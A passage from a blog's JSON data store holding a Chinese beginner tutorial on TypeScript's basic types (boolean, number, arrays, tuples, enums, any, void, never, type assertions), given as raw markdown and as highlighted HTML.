取值和允许数字赋值给枚举类型或枚举类型赋值给数字。</p>"},{"title":"Typescript学习日记(一)","date":"2017-01-08T08:14:30.000Z","_content":"\n`javascript` 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 `弱类型` 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 `状态` 变的难以追踪将会引发很多的 `bug` 出现。\n例子：\n```ts\nvar test;\n\ntypeof test;\n// -> 'undefined'\n\ntest = 'str';\n\ntypeof test;\n// -> 'string'\n\ntest = 123;\n\ntypeof test;\n// -> 'number'\n```\n\n<!-- more -->\n\n### Typescript\n`typescript` 是 `javascript` 的强类型版本。它会在编译期去掉类型和特有语法生成 `javascript` 代码。`typescript` 是 `javascript` 的超集，它支持所有 `javascript语法`，与此同时它又为 `javascript` 添加了\b `静态类型检查` 使得 `javacript` 也拥有了 `强类型语言` 的特性。\n\n\n### Typescript 基础类型\n\n#### 布尔值(boolean)\n```ts\nlet bool: boolean = false;\n\nbool = 123;\n// \b报错，123是number类型而非boolean类型\n\nbool = true;\n// ok，true是一个boolean类型\n```\n\n#### 数值(number)\n```ts\nlet num: number = 123;\n\nnum = 'str';\n// error\n\nnum = 456;\n// success\n```\n\n#### 字符串(string)\n```ts\nlet str: string = 'str';\n// ...\n```\n\n#### 数组(array)\n**定义方式：**\n第一种，可以在 `元素类型` 后面接上 `[]`。\n```ts\nlet arr: number[] = [1,2,3];\n```\n\n第二种，使用 `数组泛型` 定义。\n```ts\nlet arr: Array<number> = [4,5,6];\n```\n\n#### 元组(tuple)\n元组类型允许表示一个已知元素数量和类型的数组(其实就是一个数组内包含多个类型的值)。\n```ts\nlet tup: [number, string] = [123,'str'];\n```\n\n#### 枚举(enum)\n`enum` 类型是对JavaScript标准数据类型的一个补充。 像C#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。\n**用人话说就是：把一组值放到一个可\b迭代的对象中，然后给这个对象起了个名字。**\n\n```ts\nenum animal {dog,cat,pig}\n\n// 对象取值\nlet a: animal = animal.dog\n\n// 数组取值\nlet b = animal[0] // -> dog\nlet b = animal[1] // -> cat\n\n// 可以手动更改索引\n// enum animal {dog = 1, cat, pig}\n// let b = animal[1] // -> dog\n// let b = animal[2] // -> cat\n```\n\n#### 任何类型(any)\n若是不清楚变量的具体类型可以指定为 `any`。\n\n```ts\nlet a: any = false;\n\na = 'str'; // success\na = 123; // success\n```\n\n#### 无类型(void)\n与 `any` 相反。一个函数没有返回值的时候通常指定其返回值类型为 `void`。\n一个 `void` 类型的变量只能赋值为 `undefined` | `null`。\n```ts\nfunction noReturn(): void {\n    console.log('这个函数没有返回值')\n}\n\nlet n: void = null;\n// let n: void = undefined;\n```\n\n#### null和undefined\n\n`undefined`和`null`两者各自有自己的类型还是叫做`undefined`和`null`。\n\n**默认情况下null和undefined是所有类型的子类型。 就是说你可以把 null和undefined赋值给number类型的变量。**\n\n```ts\nlet u: undefined = undefined;\nlet n: null = null;\n\nlet num: number = 123;\nnum = undefined; // success\n```\n\n#### 永远不存在的值(never)\n例如， never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；\n**never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使 any也不可以赋值给never。**\n\n```ts\nlet n: never; // never 不能被赋值\nlet num: number = 123;\nlet a: any;\n\nnum = n; // success，never类型是任何类型的子类型\n\nn = 123; // error\nn = a; // error\n```\n\n```ts\n// 返回never的函数必须存在无法达到的终点\nfunction error(message: string): never {\n    throw new Error(message);\n}\n```\n\n#### 类型断言\n\n有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。\n\n```ts\nlet str: any = \"this is a string\";\nlet strLength1: number;\nlet strLength2: number;\n\n// 使用 as 断言语法\nstrLength1 = (str as string).length;\n\n// 使用 <> 断言语法\nstrLength2 = (<string>str).length;\n\n// 上面这两种断言方式得到的效果完全一致，下面增加的内容是因为模版出了点bug\n// 对于语法的解析已经不是js的语法了，不填充以下内容，整块js都无法展示\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\n```\n\n以上是 `typescript` 所有的基础类型。\n","source":"_posts/Typescript学习日记（一）.md","raw":"---\ntitle: Typescript学习日记(一)\ndate: 2017-01-08 16:14:30\ntags:\n---\n\n`javascript` 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 `弱类型` 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 `状态` 变的难以追踪将会引发很多的 `bug` 出现。\n例子：\n```ts\nvar test;\n\ntypeof test;\n// -> 'undefined'\n\ntest = 'str';\n\ntypeof test;\n// -> 'string'\n\ntest = 123;\n\ntypeof test;\n// -> 'number'\n```\n\n<!-- more -->\n\n### Typescript\n`typescript` 是 `javascript` 的强类型版本。它会在编译期去掉类型和特有语法生成 `javascript` 代码。`typescript` 是 `javascript` 的超集，它支持所有 `javascript语法`，与此同时它又为 `javascript` 添加了\b `静态类型检查` 使得 `javacript` 也拥有了 `强类型语言` 的特性。\n\n\n### Typescript 基础类型\n\n#### 布尔值(boolean)\n```ts\nlet bool: boolean = false;\n\nbool = 123;\n// \b报错，123是number类型而非boolean类型\n\nbool = true;\n// ok，true是一个boolean类型\n```\n\n#### 数值(number)\n```ts\nlet num: number = 123;\n\nnum = 'str';\n// error\n\nnum = 456;\n// success\n```\n\n#### 字符串(string)\n```ts\nlet str: string = 'str';\n// ...\n```\n\n#### 数组(array)\n**定义方式：**\n第一种，可以在 `元素类型` 后面接上 `[]`。\n```ts\nlet arr: number[] = [1,2,3];\n```\n\n第二种，使用 `数组泛型` 定义。\n```ts\nlet arr: Array<number> = [4,5,6];\n```\n\n#### 元组(tuple)\n元组类型允许表示一个已知元素数量和类型的数组(其实就是一个数组内包含多个类型的值)。\n```ts\nlet tup: [number, string] = [123,'str'];\n```\n\n#### 枚举(enum)\n`enum` 类型是对JavaScript标准数据类型的一个补充。 像C#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。\n**用人话说就是：把一组值放到一个可\b迭代的对象中，然后给这个对象起了个名字。**\n\n```ts\nenum animal {dog,cat,pig}\n\n// 对象取值\nlet a: animal = animal.dog\n\n// 数组取值\nlet b = animal[0] // -> dog\nlet b = animal[1] // -> cat\n\n// 可以手动更改索引\n// enum animal {dog = 1, cat, pig}\n// let b = animal[1] // -> dog\n// let b = animal[2] // -> cat\n```\n\n#### 任何类型(any)\n若是不清楚变量的具体类型可以指定为 `any`。\n\n```ts\nlet a: any = false;\n\na = 'str'; // success\na = 123; // success\n```\n\n#### 无类型(void)\n与 `any` 相反。一个函数没有返回值的时候通常指定其返回值类型为 `void`。\n一个 `void` 类型的变量只能赋值为 `undefined` | `null`。\n```ts\nfunction noReturn(): void {\n    console.log('这个函数没有返回值')\n}\n\nlet n: void = null;\n// let n: void = undefined;\n```\n\n#### null和undefined\n\n`undefined`和`null`两者各自有自己的类型还是叫做`undefined`和`null`。\n\n**默认情况下null和undefined是所有类型的子类型。 就是说你可以把 null和undefined赋值给number类型的变量。**\n\n```ts\nlet u: undefined = undefined;\nlet n: null = null;\n\nlet num: number = 123;\nnum = undefined; // success\n```\n\n#### 永远不存在的值(never)\n例如， never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；\n**never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使 any也不可以赋值给never。**\n\n```ts\nlet n: never; // never 不能被赋值\nlet num: number = 123;\nlet a: any;\n\nnum = n; // success，never类型是任何类型的子类型\n\nn = 123; // error\nn = a; // error\n```\n\n```ts\n// 返回never的函数必须存在无法达到的终点\nfunction error(message: string): never {\n    throw new Error(message);\n}\n```\n\n#### 类型断言\n\n有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。\n\n```ts\nlet str: any = \"this is a string\";\nlet strLength1: number;\nlet strLength2: number;\n\n// 使用 as 断言语法\nstrLength1 = (str as string).length;\n\n// 使用 <> 断言语法\nstrLength2 = (<string>str).length;\n\n// 上面这两种断言方式得到的效果完全一致，下面增加的内容是因为模版出了点bug\n// 对于语法的解析已经不是js的语法了，不填充以下内容，整块js都无法展示\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\nstrLength1 === strLength2; // -> true\n```\n\n以上是 `typescript` 所有的基础类型。\n","slug":"Typescript学习日记（一）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qh000602vshfn8ra52","content":"<p><code>javascript</code> 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 <code>弱类型</code> 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 <code>状态</code> 变的难以追踪将会引发很多的 <code>bug</code> 出现。<br>例子：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> test;</span><br><span class=\"line\"><span class=\"comment\">// -&gt; 'undefined'</span></span><br><span class=\"line\"></span><br><span class=\"line\">test = <span class=\"string\">'str'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> test;</span><br><span class=\"line\"><span class=\"comment\">// -&gt; 'string'</span></span><br><span class=\"line\"></span><br><span class=\"line\">test = <span class=\"number\">123</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> test;</span><br><span class=\"line\"><span class=\"comment\">// -&gt; 'number'</span></span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h3 id=\"Typescript\"><a href=\"#Typescript\" class=\"headerlink\" title=\"Typescript\"></a>Typescript</h3><p><code>typescript</code> 是 <code>javascript</code> 的强类型版本。它会在编译期去掉类型和特有语法生成 <code>javascript</code> 代码。<code>typescript</code> 是 <code>javascript</code> 的超集，它支持所有 <code>javascript语法</code>，与此同时它又为 <code>javascript</code> 添加了\b <code>静态类型检查</code> 使得 <code>javacript</code> 也拥有了 <code>强类型语言</code> 的特性。</p>\n<h3 id=\"Typescript-基础类型\"><a href=\"#Typescript-基础类型\" class=\"headerlink\" title=\"Typescript 基础类型\"></a>Typescript 基础类型</h3><h4 id=\"布尔值-boolean\"><a href=\"#布尔值-boolean\" class=\"headerlink\" title=\"布尔值(boolean)\"></a>布尔值(boolean)</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> bool: <span class=\"built_in\">boolean</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">bool = <span class=\"number\">123</span>;</span><br><span class=\"line\"><span class=\"comment\">// \b报错，123是number类型而非boolean类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">bool = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"comment\">// ok，true是一个boolean类型</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"数值-number\"><a href=\"#数值-number\" class=\"headerlink\" title=\"数值(number)\"></a>数值(number)</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> num: <span class=\"built_in\">number</span> = <span class=\"number\">123</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">num = <span class=\"string\">'str'</span>;</span><br><span class=\"line\"><span class=\"comment\">// error</span></span><br><span class=\"line\"></span><br><span class=\"line\">num = <span class=\"number\">456</span>;</span><br><span class=\"line\"><span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"字符串-string\"><a href=\"#字符串-string\" class=\"headerlink\" title=\"字符串(string)\"></a>字符串(string)</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> str: <span class=\"built_in\">string</span> = <span class=\"string\">'str'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"数组-array\"><a href=\"#数组-array\" class=\"headerlink\" title=\"数组(array)\"></a>数组(array)</h4><p><strong>定义方式：</strong><br>第一种，可以在 <code>元素类型</code> 后面接上 <code>[]</code>。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr: <span class=\"built_in\">number</span>[] = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br></pre></td></tr></table></figure></p>\n<p>第二种，使用 <code>数组泛型</code> 定义。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr: <span class=\"built_in\">Array</span>&lt;<span class=\"built_in\">number</span>&gt; = [<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>];</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"元组-tuple\"><a href=\"#元组-tuple\" class=\"headerlink\" title=\"元组(tuple)\"></a>元组(tuple)</h4><p>元组类型允许表示一个已知元素数量和类型的数组(其实就是一个数组内包含多个类型的值)。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> tup: [<span class=\"built_in\">number</span>, <span class=\"built_in\">string</span>] = [<span class=\"number\">123</span>,<span class=\"string\">'str'</span>];</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"枚举-enum\"><a href=\"#枚举-enum\" class=\"headerlink\" title=\"枚举(enum)\"></a>枚举(enum)</h4><p><code>enum</code> 类型是对JavaScript标准数据类型的一个补充。 像C#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。<br><strong>用人话说就是：把一组值放到一个可\b迭代的对象中，然后给这个对象起了个名字。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> animal &#123;dog,cat,pig&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 对象取值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> a: animal = animal.dog</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 数组取值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> b = animal[<span class=\"number\">0</span>] <span class=\"comment\">// -&gt; dog</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> b = animal[<span class=\"number\">1</span>] <span class=\"comment\">// -&gt; cat</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 可以手动更改索引</span></span><br><span class=\"line\"><span class=\"comment\">// enum animal &#123;dog = 1, cat, pig&#125;</span></span><br><span class=\"line\"><span class=\"comment\">// let b = animal[1] // -&gt; dog</span></span><br><span class=\"line\"><span class=\"comment\">// let b = animal[2] // -&gt; cat</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"任何类型-any\"><a href=\"#任何类型-any\" class=\"headerlink\" title=\"任何类型(any)\"></a>任何类型(any)</h4><p>若是不清楚变量的具体类型可以指定为 <code>any</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a: <span class=\"built_in\">any</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">a = <span class=\"string\">'str'</span>; <span class=\"comment\">// success</span></span><br><span class=\"line\">a = <span class=\"number\">123</span>; <span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"无类型-void\"><a href=\"#无类型-void\" class=\"headerlink\" title=\"无类型(void)\"></a>无类型(void)</h4><p>与 <code>any</code> 相反。一个函数没有返回值的时候通常指定其返回值类型为 <code>void</code>。<br>一个 <code>void</code> 类型的变量只能赋值为 <code>undefined</code> | <code>null</code>。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">noReturn</span>(<span class=\"params\"></span>): <span class=\"title\">void</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这个函数没有返回值'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> n: <span class=\"built_in\">void</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// let n: void = undefined;</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"null和undefined\"><a href=\"#null和undefined\" class=\"headerlink\" title=\"null和undefined\"></a>null和undefined</h4><p><code>undefined</code>和<code>null</code>两者各自有自己的类型还是叫做<code>undefined</code>和<code>null</code>。</p>\n<p><strong>默认情况下null和undefined是所有类型的子类型。 就是说你可以把 null和undefined赋值给number类型的变量。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> u: <span class=\"literal\">undefined</span> = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> n: <span class=\"literal\">null</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> num: <span class=\"built_in\">number</span> = <span class=\"number\">123</span>;</span><br><span class=\"line\">num = <span class=\"literal\">undefined</span>; <span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"永远不存在的值-never\"><a href=\"#永远不存在的值-never\" class=\"headerlink\" title=\"永远不存在的值(never)\"></a>永远不存在的值(never)</h4><p>例如， never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；<br><strong>never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使 any也不可以赋值给never。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> n: never; <span class=\"comment\">// never 不能被赋值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> num: <span class=\"built_in\">number</span> = <span class=\"number\">123</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a: <span class=\"built_in\">any</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">num = n; <span class=\"comment\">// success，never类型是任何类型的子类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">123</span>; <span class=\"comment\">// error</span></span><br><span class=\"line\">n = a; <span class=\"comment\">// error</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 返回never的函数必须存在无法达到的终点</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">error</span>(<span class=\"params\">message: <span class=\"built_in\">string</span></span>): <span class=\"title\">never</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(message);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"类型断言\"><a href=\"#类型断言\" class=\"headerlink\" title=\"类型断言\"></a>类型断言</h4><p>有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> str: <span class=\"built_in\">any</span> = <span class=\"string\">\"this is a string\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> strLength1: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> strLength2: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 as 断言语法</span></span><br><span class=\"line\">strLength1 = (str <span class=\"keyword\">as</span> <span class=\"built_in\">string</span>).length;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 &lt;&gt; 断言语法</span></span><br><span class=\"line\">strLength2 = (&lt;<span class=\"built_in\">string</span>&gt;str).length;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 上面这两种断言方式得到的效果完全一致，下面增加的内容是因为模版出了点bug</span></span><br><span class=\"line\"><span class=\"comment\">// 对于语法的解析已经不是js的语法了，不填充以下内容，整块js都无法展示</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br></pre></td></tr></table></figure>\n<p>以上是 <code>typescript</code> 所有的基础类型。</p>\n","site":{"data":{}},"excerpt":"<p><code>javascript</code> 是运行在浏览器中的一门脚本语言，为了尽可能的减少内存的开支所以在设计之初它就是一门 <code>弱类型</code> 的语言。这在开发小而简单的应用时是可以为我们带来性能的提升，但是随着项目的扩大 <code>状态</code> 变的难以追踪将会引发很多的 <code>bug</code> 出现。<br>例子：<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> test;</span><br><span class=\"line\"><span class=\"comment\">// -&gt; 'undefined'</span></span><br><span class=\"line\"></span><br><span class=\"line\">test = <span class=\"string\">'str'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> test;</span><br><span class=\"line\"><span class=\"comment\">// -&gt; 'string'</span></span><br><span class=\"line\"></span><br><span class=\"line\">test = <span class=\"number\">123</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> test;</span><br><span class=\"line\"><span class=\"comment\">// -&gt; 'number'</span></span><br></pre></td></tr></table></figure></p>","more":"<h3 id=\"Typescript\"><a href=\"#Typescript\" class=\"headerlink\" title=\"Typescript\"></a>Typescript</h3><p><code>typescript</code> 是 <code>javascript</code> 的强类型版本。它会在编译期去掉类型和特有语法生成 <code>javascript</code> 代码。<code>typescript</code> 是 <code>javascript</code> 的超集，它支持所有 <code>javascript语法</code>，与此同时它又为 <code>javascript</code> 添加了\b <code>静态类型检查</code> 使得 <code>javacript</code> 也拥有了 <code>强类型语言</code> 的特性。</p>\n<h3 id=\"Typescript-基础类型\"><a href=\"#Typescript-基础类型\" class=\"headerlink\" title=\"Typescript 基础类型\"></a>Typescript 基础类型</h3><h4 id=\"布尔值-boolean\"><a href=\"#布尔值-boolean\" class=\"headerlink\" title=\"布尔值(boolean)\"></a>布尔值(boolean)</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> bool: <span class=\"built_in\">boolean</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">bool = <span class=\"number\">123</span>;</span><br><span class=\"line\"><span class=\"comment\">// \b报错，123是number类型而非boolean类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">bool = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"comment\">// ok，true是一个boolean类型</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"数值-number\"><a href=\"#数值-number\" class=\"headerlink\" title=\"数值(number)\"></a>数值(number)</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> num: <span class=\"built_in\">number</span> = <span class=\"number\">123</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">num = <span class=\"string\">'str'</span>;</span><br><span class=\"line\"><span class=\"comment\">// error</span></span><br><span class=\"line\"></span><br><span class=\"line\">num = <span class=\"number\">456</span>;</span><br><span class=\"line\"><span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"字符串-string\"><a href=\"#字符串-string\" class=\"headerlink\" title=\"字符串(string)\"></a>字符串(string)</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> str: <span class=\"built_in\">string</span> = <span class=\"string\">'str'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"数组-array\"><a href=\"#数组-array\" class=\"headerlink\" title=\"数组(array)\"></a>数组(array)</h4><p><strong>定义方式：</strong><br>第一种，可以在 <code>元素类型</code> 后面接上 <code>[]</code>。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr: <span class=\"built_in\">number</span>[] = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</span><br></pre></td></tr></table></figure></p>\n<p>第二种，使用 <code>数组泛型</code> 